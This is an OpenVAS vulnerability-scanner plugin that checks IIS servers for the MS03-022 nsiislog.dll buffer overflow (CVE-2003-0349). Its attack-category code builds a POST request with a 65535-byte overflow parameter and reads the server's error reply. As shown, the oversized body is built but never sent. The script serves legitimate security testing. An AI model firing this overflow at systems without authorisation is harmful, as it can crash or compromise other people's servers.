###################################################################
# OpenVAS Vulnerability Test
# $Id: remote-MS03-022.nasl 14325 2019-03-19 13:35:02Z asteins $
#
# Microsoft Security Bulletin MS03-022
# Vulnerability in ISAPI Extension for Windows Media Services Could Cause Code Execution
# Microsoft Windows Media Services 'nsiislog.dll' Buffer Overflow Vulnerability (MS03-019)
# BUGTRAQ:20030626 Windows Media Services Remote Command Execution #2
#
# Affected Software:
# Microsoft Windows 2000
#
# Not Affected Software Versions:
# Microsoft Windows XP
# Microsoft Windows Server 2003
#
# remote-MS03-022.nasl
#
# Author:
# Christian Eric Edjenguele <christian.edjenguele@owasp.org>
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2 or later,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.101016");
  script_version("$Revision: 14325 $");
  script_tag(name:"last_modification", value:"$Date: 2019-03-19 14:35:02 +0100 (Tue, 19 Mar 2019) $");
  script_tag(name:"creation_date", value:"2009-03-16 23:15:41 +0100 (Mon, 16 Mar 2009)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_cve_id("CVE-2003-0349");
  script_name("Microsoft MS03-022 security check");
  script_category(ACT_ATTACK);
  script_copyright("Christian Eric Edjenguele <christian.edjenguele@owasp.org>");
  script_family("Windows : Microsoft Bulletins");
  script_dependencies("secpod_ms_iis_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("IIS/installed");

  script_tag(name:"solution", value:"Microsoft has released a patch to correct these issues.
  Please see the references for more information.


  Note: This patch can be installed on systems running Microsoft Windows 2000 Service Pack 2,
  Windows 2000 Service Pack 3 and Microsoft Windows 2000 Service Pack 4.
  This patch has been superseded by the one provided in Microsoft Security Bulletin MS03-019.");
  script_tag(name:"summary", value:"There is a flaw in the way nsiislog.dll processes incoming client requests.
  A vulnerability exists because an attacker could send specially formed HTTP request (communications)
  to the server that could cause IIS to fail or execute code on the user's system.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_vul");

  script_xref(name:"URL", value:"http://www.microsoft.com/downloads/details.aspx?FamilyId=F772E131-BBC9-4B34-9E78-F71D9742FED8&displaylang=en");
  script_xref(name:"URL", value:"http://www.microsoft.com/technet/security/bulletin/MS03-019.mspx");

  exit(0);
}

include("http_func.inc");

port = get_http_port( default:80 );

hostname = http_host_name( port:port );

remote_exe = '';

soc = open_sock_tcp(port);
if( ! soc ) exit( 0 );

req = http_get( item:"/scripts/nsiislog.dll", port:port );
send( socket:soc, data:req );

reply = recv( socket:soc, length:4096 );

if( reply ) {

  if( 'NetShow ISAPI Log Dll' >< reply ) {

    url_args = make_list('date', 'time',
                         'c-dns', 'cs-uri-stem', 'c-starttime', 'x-duration', 'c-rate',
                         'c-status', 'c-playerid',  'c-playerversion', 'c-player-language',
                         'cs(User-Agent)', 'cs(Referer)', 'c-hostexe');

    foreach parameter (url_args) remote_exe += parameter + "=openvas&";

    remote_exe += 'c-ip=' + crap(65535);

    mpclient = string("POST /", "/scripts/nsiislog.dll", " HTTP/1.0\r\n",
                      "Host: ", hostname, "\r\n",
                      "User-Agent: ", "NSPlayer/2.0", "\r\n",
                      "Content-Type: ", "application/x-www-form-urlencoded" , "\r\n",
                      "Content-Length: ",  strlen(remote_exe) , "\r\n\r\n");

    send( socket:soc, data:mpclient );

    response = recv(socket:soc, length:4096);
    if( ( egrep( pattern:"HTTP/1.[01] 500", string:response ) ) && ( 'The remote procedure call failed. ' >< response ) ) {
      security_message( port:port );
    }
  }
}

close( soc );

exit( 0 );
